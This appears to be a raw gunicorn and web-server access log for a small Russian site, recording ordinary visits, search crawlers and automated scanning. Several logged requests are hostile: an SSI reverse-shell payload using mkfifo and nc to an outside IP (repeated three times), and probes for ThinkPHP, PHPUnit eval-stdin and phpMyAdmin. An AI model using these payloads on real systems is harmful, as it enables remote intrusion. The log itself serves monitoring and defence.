[2020-02-17 17:55:28 +0300] [31714] [INFO] Starting gunicorn 20.0.4
[2020-02-17 17:55:28 +0300] [31714] [INFO] Listening at: http://127.0.0.1:8000 (31714)
[2020-02-17 17:55:28 +0300] [31714] [INFO] Using worker: sync
[2020-02-17 17:55:28 +0300] [31717] [INFO] Booting worker with pid: 31717
[2020-02-17 17:56:19 +0300] [31714] [INFO] Handling signal: hup
[2020-02-17 17:56:19 +0300] [31714] [INFO] Hang up: Master
[2020-02-17 17:56:19 +0300] [31751] [INFO] Booting worker with pid: 31751
127.0.0.1 - - [19/Feb/2020:13:22:50 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:22:50 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:22:50 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:22:50 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:22:51 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/images/logo.png HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:40 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/images/logo.png HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:23:42 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 200 0 "http://89.223.29.224/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:35:18 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/images/logo.png HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:39:45 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:01 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /media/css/sequence_number.css HTTP/1.0" 200 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /media/js/sequence_number.js HTTP/1.0" 200 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /media/js/excellentexport.min.js HTTP/1.0" 200 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:13:40:02 +0000] "GET /sequence_number/favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:14:04:09 +0000] "GET / HTTP/1.0" 200 3633 "-" "python-requests/2.22.0"
127.0.0.1 - - [19/Feb/2020:14:07:01 +0000] "GET /cart HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [19/Feb/2020:14:49:32 +0000] "GET /ryba HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [19/Feb/2020:15:06:23 +0000] "GET / HTTP/1.0" 400 26 "-" "Go 1.1 package http"
127.0.0.1 - - [19/Feb/2020:15:35:55 +0000] "HEAD /robots.txt HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [19/Feb/2020:16:12:50 +0000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2037.49.226.137%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [19/Feb/2020:16:49:30 +0000] "GET /ryba/okun-rechnoy HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [19/Feb/2020:17:02:15 +0000] "GET / HTTP/1.0" 200 3633 "http://yapl.ru/ru/ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:17:04:30 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:17:34:17 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:17:34:17 +0000] "GET /ryba/soroga HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:17:38:41 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
127.0.0.1 - - [19/Feb/2020:17:42:16 +0000] "GET /favicon.ico HTTP/1.0" 301 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
127.0.0.1 - - [19/Feb/2020:17:42:16 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
127.0.0.1 - - [19/Feb/2020:17:46:18 +0000] "GET /phpmyadmin HTTP/1.0" 301 0 "http://89.223.29.224/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
127.0.0.1 - - [19/Feb/2020:17:46:19 +0000] "GET /phpmyadmin/ HTTP/1.0" 404 1688 "http://89.223.29.224/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
127.0.0.1 - - [19/Feb/2020:18:32:50 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:18:37:49 +0000] "GET /robots.txt HTTP/1.0" 301 0 "-" "Mozilla/5.0 (compatible; Svetabot/1.0; +http://svetabot.online/index.php"
127.0.0.1 - - [19/Feb/2020:18:37:49 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (compatible; Svetabot/1.0; +http://svetabot.online/index.php"
127.0.0.1 - - [19/Feb/2020:18:37:49 +0000] "GET /sequence_number HTTP/1.0" 301 0 "-" "Mozilla/5.0 (compatible; Svetabot/1.0; +http://svetabot.online/index.php"
127.0.0.1 - - [19/Feb/2020:18:55:04 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:18:55:05 +0000] "GET /konservy HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:19:21:27 +0000] "GET /phpmyadmin HTTP/1.0" 301 0 "http://89.223.29.224/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
127.0.0.1 - - [19/Feb/2020:19:21:27 +0000] "GET /phpmyadmin/ HTTP/1.0" 404 1688 "http://89.223.29.224/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
127.0.0.1 - - [19/Feb/2020:19:33:01 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [19/Feb/2020:19:41:58 +0000] "GET / HTTP/1.0" 400 26 "-" "Python-urllib/3.7"
127.0.0.1 - - [19/Feb/2020:19:44:59 +0000] "GET /suvenirnaya-produktsiya HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:20:39:08 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [19/Feb/2020:20:39:12 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [19/Feb/2020:20:57:36 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [19/Feb/2020:20:57:37 +0000] "GET /discounts HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [19/Feb/2020:21:28:15 +0000] "GET /?s= HTTP/1.0" 400 26 "vk.com/bog" "Mozilla/5.84259 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84259 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:21:55:47 +0000] "GET /yagody/chernaya-smorodina HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [19/Feb/2020:22:14:51 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [19/Feb/2020:22:30:31 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:30:31 +0000] "GET /solr/admin/info/system/?wt=json HTTP/1.0" 404 1688 "http://89.223.29.224:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:34:52 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:34:55 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:36:52 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:36:52 +0000] "GET /index.php/?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.0" 404 1688 "http://89.223.29.224:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [19/Feb/2020:22:59:26 +0000] "GET /wp-login.php HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [19/Feb/2020:22:59:26 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [19/Feb/2020:23:13:09 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0"
127.0.0.1 - - [20/Feb/2020:00:39:59 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
127.0.0.1 - - [20/Feb/2020:00:39:59 +0000] "GET /HNAP1/ HTTP/1.0" 404 1688 "http://89.223.29.224/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
127.0.0.1 - - [20/Feb/2020:00:42:09 +0000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2037.49.226.137%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [20/Feb/2020:00:47:00 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [20/Feb/2020:01:35:58 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:01:35:58 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/ HTTP/1.0" 404 1688 "http://89.223.29.224:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:01:59:05 +0000] "GET /yagody HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [20/Feb/2020:02:21:12 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:02:25:03 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:02:57:17 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
127.0.0.1 - - [20/Feb/2020:02:57:30 +0000] "GET /wp-login.php HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [20/Feb/2020:02:57:30 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [20/Feb/2020:02:57:50 +0000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2037.49.226.137%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [20/Feb/2020:04:25:26 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [20/Feb/2020:04:25:27 +0000] "GET /?page=7 HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [20/Feb/2020:04:25:46 +0000] "GET / HTTP/1.0" 400 26 "http://green.naoshop.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:04:55:30 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [20/Feb/2020:04:55:30 +0000] "GET /ads.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [20/Feb/2020:05:09:49 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:05:10:54 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [20/Feb/2020:05:10:55 +0000] "GET /ryba/schuka-ot-5kg HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [20/Feb/2020:05:27:17 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [20/Feb/2020:05:43:32 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:05:59:56 +0000] "GET /wp-login.php HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [20/Feb/2020:05:59:57 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
127.0.0.1 - - [20/Feb/2020:06:03:17 +0000] "GET / HTTP/1.0" 200 3633 "-" "libwww-perl/6.35"
127.0.0.1 - - [20/Feb/2020:06:30:08 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
127.0.0.1 - - [20/Feb/2020:06:34:25 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)"
127.0.0.1 - - [20/Feb/2020:06:34:27 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)"
127.0.0.1 - - [20/Feb/2020:06:43:22 +0000] "GET /robots.txt HTTP/1.0" 301 0 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
